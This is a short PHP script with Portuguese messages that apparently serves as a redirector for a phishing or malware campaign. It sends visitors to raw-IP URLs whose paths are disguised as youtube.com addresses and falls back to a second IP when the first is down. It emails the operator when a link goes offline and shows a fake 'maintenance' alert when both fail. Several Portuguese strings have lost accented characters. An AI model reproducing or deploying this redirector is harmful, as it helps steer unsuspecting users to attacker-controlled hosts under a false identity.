<?

$link1 = "http://173.243.117.30/91824452/4554/5546753/1345/9566/youtube.com/videos/s/mineiros93123.br.youtube.com";

$link2 = "http://173.243.117.19/91824452/4554/5546753/1345/9566/youtube.com/videos/s/mineiros93123.br.youtube.com";



$email = "linitz@gmail.com";

$assunto = "Falha do LINK";







$l1 = @fopen($link1, "r");



if ($l1){

header("Location: $link1");

exit;

}



 else{

 $msg = "Esta ma mensagem automatica do sistema \n\n

 que lhe avisa que o link --> $link1 \n\n

 N ESTRESPONDENDO ( OFF-LINE! ) \n\n

 Nresponda essa mensagem !";



 mail($email, $assunto, $msg);



 $l2 = @fopen($link2,  "r");



   if ($l2){

   header("Location: $link2");

   exit;

   }



    else {

    $msg = "Esta ma mensagem automatica do sistema \n\n

    que lhe avisa que o link --> $link2 \n\n

    N ESTRESPONDENDO ( OFF-LINE! ) \n\n

    Nresponda essa mensagem !";

    mail($email, $assunto, $msg);

    print "

    <META HTTP-EQUIV=REFRESH CONTENT='0; URL=index.htm'>

    <script type=\"text/javascript\">

    alert(\"No momento os servidores estem manuten. Por favor, tente mais tarde
!\");

    </script>";

    }

 }

